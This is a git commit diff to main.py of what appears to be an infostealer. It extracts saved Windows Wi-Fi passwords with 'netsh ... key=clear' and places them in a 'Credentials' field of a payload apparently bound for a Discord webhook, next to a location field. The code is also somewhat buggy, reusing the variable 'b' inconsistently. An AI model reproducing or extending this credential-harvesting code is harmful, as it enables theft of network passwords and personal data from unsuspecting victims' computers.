473d3e6eaf6519da846c49d6188a316a3cbc65fb
burnt.chipset <121685075+burntchipset@users.noreply.github.com>
2023-01-12 14:27:05 +0100

    update wifi logger in main.py
    added the function to ignore wifi if os doesnt equal linux

--- main.py
+++ main.py
@@ -43,13 +43,16 @@ date_of_extraction = date.today()
 #finish later
 
 #extracting wifi passwords
-#FINISHED just debug
-if os == ("nt"):
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-    for i in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
-        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+if os != ("nt"):
+    b = ('Unable to get wifi')
+    pass
+else: 
+    if os == ("nt"):
+        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+        for i in profiles:
+            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
 
 #else:
 #    pass
@@ -106,10 +109,10 @@ data_to_discord["embeds"] = [
                             {googlemap}
                             ''',
                         },
-                        {  #i need to add some sort of function to ignore wifi variable when on linux, but i am too dumb to do that :D
+                        { 
                             'name': "Credentials",
                             'value':f''' 
-                             WIP
+                             {b}
 
                             ''',
                         }
